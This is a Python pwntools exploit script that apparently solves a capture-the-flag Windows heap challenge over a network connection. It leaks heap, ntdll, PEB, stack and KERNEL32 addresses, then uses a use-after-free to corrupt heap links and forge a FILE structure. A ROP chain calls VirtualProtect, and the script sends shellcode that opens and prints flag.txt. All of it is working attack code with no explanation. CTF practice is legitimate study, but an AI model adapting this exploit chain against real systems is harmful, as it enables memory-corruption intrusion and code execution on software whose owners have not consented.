#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import time

context.arch = 'amd64'
# context.log_level = 'debug'

sh = remote('192.168.3.129', 10001)

def login(user, passwd):
    sh.sendlineafter('>> ', '1')
    sh.sendafter('User:', user)
    sh.sendafter('Password:', passwd)

def add(key, size, data):
    sh.sendlineafter('>> ', '1')
    sh.sendafter('Key:', key)
    sh.sendlineafter('Size:', str(size))
    sh.sendafter('Data:', data)

def show(key):
    sh.sendlineafter('>> ', '2')
    sh.sendafter('Key:', key)
    sh.recvuntil('Data:')

def delete(key):
    sh.sendlineafter('>> ', '3')
    sh.sendafter('Key:', key)


login('orange', 'godlike')

add('11', 0x100, '11')
add('22', 0x30, '22')
add('11', 0x30, '11')
add('33', 0x200, '33')
show('11')
head = sh.recvn(0x40)
heap_addr = u64(sh.recvn(8)) - 0xa90
log.success('heap_addr: ' + hex(heap_addr))

add('11', 0x30, head + p64(heap_addr + 0x2c0))
show('33')
result = sh.recvn(8)

dot_data = 0x15f000
ntdll = (u64(result) - dot_data) & 0xffffffffffff0000
log.success('ntdll: ' + hex(ntdll))

PebLdr_symbol = 0x1653c0
add('11', 0x30, head + p64(ntdll + PebLdr_symbol -  0xb8))
show('33')
Peb_addr = u64(sh.recvn(8)) & 0xfffffffffffff000
log.success('Peb_addr: ' + hex(Peb_addr))

add('11', 0x30, head + p64(Peb_addr + 0x10))
show('33')
image_base_addr = u64(sh.recvn(8))
log.success('image_base_addr: ' + hex(image_base_addr))

Teb_addr = Peb_addr + 0x1000
add('11', 0x30, head + p64(Teb_addr + 8))
show('33')
stack_base = u64(sh.recvn(8))
log.success('stack_base: ' + hex(stack_base))

ret_content = p64(image_base_addr + 0x1E38)
main_ret = 0
offset = 0x200
while(True):
    add('11', 0x30, head + p64(stack_base - offset))
    show('33')
    result = sh.recvn(0x200)
    position = result.find(ret_content)
    if(position != -1):
        main_ret = stack_base - offset + position
        break
    offset += 0x200

log.success('main_ret: ' + hex(main_ret))

add('11', 0x30, head + p64(image_base_addr + 0x3000))
show('33')
ReadFile_addr = u64(sh.recvn(8))
KERNEL32 = ReadFile_addr - 0x22680
log.success('KERNEL32: ' + hex(KERNEL32))

# clear
add('clear', 0x50, 'clear')


add('44', 0x200, '44')
add('44', 0x50, '44')
add('55', 0x40, '55')
add('66', 0x40, '66')

# free
add('55', 0x50, '55')
add('66', 0x50, '66')

show('44')
result = sh.recvn(0x200)
xor_header = result[0x188: 0x190]


sh.sendlineafter('>> ', '4') #　logout
payload = xor_header + p64(heap_addr + 0xe50) + p64(heap_addr + 0xf10) # fake chunk
login('orange', 'godlike\0' + payload)

# UAF modify Flink and Blink
payload = result[: 0xd8] + p64(image_base_addr + 0x5658) + result[0xe0:0x190] + p64(image_base_addr + 0x5658)
add('44', 0x50, payload)

add('77', 0x40, '77')
add('88', 0x40, 'p' * 0x10 + p64(heap_addr + 0x1170)) # hijack FILE

fake_FILE = [
    0,
    main_ret - 0x280, # login ret
    p32(0), p32(0x2080),
    0,
    0x200,
    0,
    0xffffffffffffffff,
    p32(0xffffffff), p32(0),
    0,
    0,
]
add('99', 0x100, flat(fake_FILE))

sh.sendlineafter('>> ', '4') #　logout

login('aa', 'bb')

pop_rdx_ret = ntdll + 0x57642
pop_rcx_r8_r9_r10_r11_ret = ntdll + 0x8fb31

VirtualProtect = KERNEL32 + 0x1B680


layout = [
    pop_rdx_ret,
    0x1000,
    pop_rcx_r8_r9_r10_r11_ret,
    heap_addr,
    0x40, # PAGE_EXECUTE_READWRITE
    heap_addr + 0x1000,
    0,0,
    VirtualProtect,

    ntdll + 0x220dc, #: add rsp, 0x18; ret; 
    0,0,0,

    ntdll + 0x9217b, #: pop rcx; ret; 
    0xFFFFFFF6,
    KERNEL32 + 0x1c890, # GetStdHandle

    ntdll + 0x3537a, #: mov rcx, rax; mov rax, rcx; add rsp, 0x28; ret; 
    0,0,0,0,0,

    pop_rdx_ret,
    heap_addr,
    ntdll + 0x8fb32, #: pop r8; pop r9; pop r10; pop r11; ret; 
    0x100,
    heap_addr + 0x1100,
    0,
    0,
    KERNEL32 + 0x22680, # ReadFile
    heap_addr,
    0,0,0,
    0,
]

sh.send(flat(layout).ljust(0x100, '\0'))

time.sleep(1)

asm_str = '''
sub rsp, 0x1000 ;// to prevent underflowing

mov rax, 0x7478742e67616c66 ;// flag.txt
mov [rsp + 0x100], rax
mov byte ptr [rsp + 0x108], 0
lea rcx, [rsp + 0x100]
mov edx, 0x80000000
mov r8d, 1
xor r9d, r9d
mov dword ptr[rsp + 0x20], 3
mov dword ptr[rsp + 0x28], 0x80
mov [rsp + 0x30], r9
mov rax, %d
call rax ;// CreateFile

mov rcx, rax
lea rdx, [rsp + 0x200]
mov r8d, 0x200
lea r9, [rsp + 0x30]
xor eax, eax
mov [rsp + 0x20], rax
mov rax, %d
call rax ;// ReadFile

mov ecx, 0xfffffff5 ;// STD_OUTPUT_HANDLE
mov rax, %d
call rax ;// GetStdHanle

mov rcx, rax
lea rdx, [rsp + 0x200]
mov r8d, [rsp + 0x30]
lea r9, [rsp + 0x40]
xor eax, eax
mov [rsp + 0x20], rax
mov rax, %d
call rax ;// WriteFile

mov rax, %d
call rax ;// exit
''' % ( KERNEL32 + 0x222f0, KERNEL32 + 0x22680, KERNEL32 + 0x1c890, KERNEL32 + 0x22770, image_base_addr + 0x1B86)

shellcode = asm(asm_str)

sh.send(shellcode)

sh.interactive()

